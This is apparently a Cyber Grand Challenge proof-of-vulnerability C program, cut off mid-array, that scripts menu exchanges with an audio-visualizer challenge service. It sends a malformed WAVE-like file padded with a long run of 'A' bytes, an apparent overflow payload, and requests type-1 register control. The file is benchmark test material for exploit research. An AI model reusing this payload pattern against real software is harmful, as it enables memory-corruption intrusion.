#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x2d\x2d\x4e\x4f\x20\x46\x49\x4c\x45\x20\x4c\x4f\x41\x44\x45\x44"
         "\x2d\x2d\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 19);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x46\x69\x6c\x65\x0a\x32\x2e\x20"
         "\x51\x75\x69\x74\x0a\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x6e\x62\x37\x22\x6d\x20\x3f\x34\x32\x72\x0a";
      static unsigned int write_00000_00000_len = 11;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 1);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x45\x52\x52\x4f\x52\x3a\x20\x42\x61\x64\x20\x49\x6e\x70\x75\x74"
         "\x2e\x20\x56\x61\x6c\x69\x64\x20\x4f\x70\x74\x69\x6f\x6e\x73\x3a"
         "\x20\x31\x2c\x20\x32";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 37);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x2d\x2d\x4e\x4f\x20\x46\x49\x4c\x45\x20\x4c\x4f\x41\x44\x45\x44"
         "\x2d\x2d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 19);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x46\x69\x6c\x65\x0a\x32\x2e\x20"
         "\x51\x75\x69\x74\x0a\x0a";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 22);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x31\x0a";
      static unsigned int write_00001_00000_len = 2;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x46\x46\x49\x52\x26\x00\x00\x00\x55\x57\x46\x43\x63\x67\x63\x20"
         "\x00\xff\xff\xff\x01\x00\x02\x00\x22\x56\x00\x00\x88\x58\x01\x00"
         "\x04\x00\x10\x00\x64\x61\x74\x61\x12\x01\x00\x00\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
         "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
      static unsigned int write_00002_00000_len = 318;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x0a\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 2);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 196);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00004_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x35\x0a";
      static unsigned int write_00003_00000_len = 2;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x0a\x0a";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 2);
      if (read_00005_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00005_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00005_ptr += cgc_data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 196);
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** delimited read
      static unsigned char read_00006_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00006 = NULL;
      read_00006_len = 0;
      int read_00006_res = cgc_delimited_read(0, &read_00006, &read_00006_len, read_00006_delim, 4);
      if (read_00006_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00006_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00006_00000_match;
      pcre *read_00006_00000_pcre = cgc_init_regex(read_00006_00000_regex);
      if (read_00006_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00006_00000_pcre, 0, read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, &read_00006_00000_match);
         if (rc > 0) {
            read_00006_ptr += read_00006_00000_match.match_end - read_00006_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00006_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x36\x0a";
      static unsigned int write_00004_00000_len = 2;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** delimited read
      static unsigned char read_00007_delim[] = 
         "\x0a\x0a";
      read_00007 = NULL;
      read_00007_len = 0;
      int read_00007_res = cgc_delimited_read(0, &read_00007, &read_00007_len, read_00007_delim, 2);
      if (read_00007_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00007_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00007_ptr += cgc_data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 196);
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** delimited read
      static unsigned char read_00008_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00008 = NULL;
      read_00008_len = 0;
      int read_00008_res = cgc_delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 4);
      if (read_00008_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00008_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00008_00000_match;
      pcre *read_00008_00000_pcre = cgc_init_regex(read_00008_00000_regex);
      if (read_00008_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00008_00000_pcre, 0, read_00008 + read_00008_ptr, read_00008_len - read_00008_ptr, &read_00008_00000_match);
         if (rc > 0) {
            read_00008_ptr += read_00008_00000_match.match_end - read_00008_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00008_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x33\x0a";
      static unsigned int write_00005_00000_len = 2;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** delimited read
      static unsigned char read_00009_delim[] = 
         "\x2b\x2b\x2b\x2b\x45\x4e\x44\x20\x56\x49\x53\x55\x41\x4c\x49\x5a"
         "\x41\x54\x49\x4f\x4e\x2b\x2b\x2b\x2b\x0a\x0a";
      read_00009 = NULL;
      read_00009_len = 0;
      int read_00009_res = cgc_delimited_read(0, &read_00009, &read_00009_len, read_00009_delim, 27);
      if (read_00009_res) {} //silence unused variable warning
      /* read match pcre:
(?:\ {3}(?:\|[\ \|=-]{5}\|){12}
*)*
*/
      static char read_00009_00000_regex[] = 
         "\x28\x3f\x3a\x5c\x20\x7b\x33\x7d\x28\x3f\x3a\x5c\x7c\x5b\x5c\x20"
         "\x5c\x7c\x3d\x2d\x5d\x7b\x35\x7d\x5c\x7c\x29\x7b\x31\x32\x7d\x0a"
         "\x2a\x29\x2a";
      static match_result read_00009_00000_match;
      pcre *read_00009_00000_pcre = cgc_init_regex(read_00009_00000_regex);
      if (read_00009_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00009_00000_pcre, 0, read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, &read_00009_00000_match);
         if (rc > 0) {
            read_00009_ptr += read_00009_00000_match.match_end - read_00009_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00009_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** delimited read
      static unsigned char read_00010_delim[] = 
         "\x0a\x0a";
      read_00010 = NULL;
      read_00010_len = 0;
      int read_00010_res = cgc_delimited_read(0, &read_00010, &read_00010_len, read_00010_delim, 2);
      if (read_00010_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00010_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
         "\x73\x75\x61\x6c\x69\x7a\x65\x72\x0a\x35\x2e\x20\x45\x6e\x61\x62"
         "\x6c\x65\x20\x4c\x6f\x77\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74"
         "\x65\x72\x0a\x36\x2e\x20\x45\x6e\x61\x62\x6c\x65\x20\x48\x69\x67"
         "\x68\x20\x50\x61\x73\x73\x20\x46\x69\x6c\x74\x65\x72\x0a\x37\x2e"
         "\x20\x44\x69\x73\x61\x62\x6c\x65\x20\x46\x69\x6c\x74\x65\x72\x73"
         "\x0a\x38\x2e\x20\x53\x65\x74\x20\x76\x69\x73\x75\x61\x6c\x69\x7a"
         "\x61\x74\x69\x6f\x6e\x20\x73\x70\x65\x65\x64\x20\x6d\x75\x6c\x74"
         "\x69\x70\x6c\x69\x65\x72\x20\x28\x30\x2d\x39\x29\x0a\x39\x2e\x20"
         "\x51\x75\x69\x74";
      read_00010_ptr += cgc_data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 196);
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** delimited read
      static unsigned char read_00011_delim[] = 
         "\x3a\x3a\x0a\x0a";
      read_00011 = NULL;
      read_00011_len = 0;
      int read_00011_res = cgc_delimited_read(0, &read_00011, &read_00011_len, read_00011_delim, 4);
      if (read_00011_res) {} //silence unused variable warning
      /* read match pcre:
--Current\ Track:\ Sampled\ @\d{4,5}Hz\ (?:8|16)\ bit,\ (?:Stereo|Mono)\ -\ Data\ Size=\d*
::Options:\ Filter\ Type=(?:None|Low\ Pass|High\ Pass)\ \|\ Visualization\ Slowdown\ Multiplier=[0-9]
*/
      static char read_00011_00000_regex[] = 
         "\x2d\x2d\x43\x75\x72\x72\x65\x6e\x74\x5c\x20\x54\x72\x61\x63\x6b"
         "\x3a\x5c\x20\x53\x61\x6d\x70\x6c\x65\x64\x5c\x20\x40\x5c\x64\x7b"
         "\x34\x2c\x35\x7d\x48\x7a\x5c\x20\x28\x3f\x3a\x38\x7c\x31\x36\x29"
         "\x5c\x20\x62\x69\x74\x2c\x5c\x20\x28\x3f\x3a\x53\x74\x65\x72\x65"
         "\x6f\x7c\x4d\x6f\x6e\x6f\x29\x5c\x20\x2d\x5c\x20\x44\x61\x74\x61"
         "\x5c\x20\x53\x69\x7a\x65\x3d\x5c\x64\x2a\x0a\x3a\x3a\x4f\x70\x74"
         "\x69\x6f\x6e\x73\x3a\x5c\x20\x46\x69\x6c\x74\x65\x72\x5c\x20\x54"
         "\x79\x70\x65\x3d\x28\x3f\x3a\x4e\x6f\x6e\x65\x7c\x4c\x6f\x77\x5c"
         "\x20\x50\x61\x73\x73\x7c\x48\x69\x67\x68\x5c\x20\x50\x61\x73\x73"
         "\x29\x5c\x20\x5c\x7c\x5c\x20\x56\x69\x73\x75\x61\x6c\x69\x7a\x61"
         "\x74\x69\x6f\x6e\x5c\x20\x53\x6c\x6f\x77\x64\x6f\x77\x6e\x5c\x20"
         "\x4d\x75\x6c\x74\x69\x70\x6c\x69\x65\x72\x3d\x5b\x30\x2d\x39\x5d";
      static match_result read_00011_00000_match;
      pcre *read_00011_00000_pcre = cgc_init_regex(read_00011_00000_regex);
      if (read_00011_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00011_00000_pcre, 0, read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, &read_00011_00000_match);
         if (rc > 0) {
            read_00011_ptr += read_00011_00000_match.match_end - read_00011_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00011_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x35\x0a";
      static unsigned int write_00006_00000_len = 2;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** delimited read
      static unsigned char read_00012_delim[] = 
         "\x0a\x0a";
      read_00012 = NULL;
      read_00012_len = 0;
      int read_00012_res = cgc_delimited_read(0, &read_00012, &read_00012_len, read_00012_delim, 2);
      if (read_00012_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00012_00000[] = 
         "\x31\x2e\x20\x4c\x6f\x61\x64\x20\x4e\x65\x77\x20\x46\x69\x6c\x65"
         "\x0a\x32\x2e\x20\x57\x61\x76\x65\x20\x56\x69\x73\x75\x61\x6c\x69"
         "\x7a\x65\x72\x0a\x33\x2e\x20\x45\x51\x20\x56\x69\x73\x75\x61\x6c"
         "\x69\x7a\x65\x72\x0a\x34\x2e\x20\x50\x6f\x77\x65\x72\x20\x56\x69"
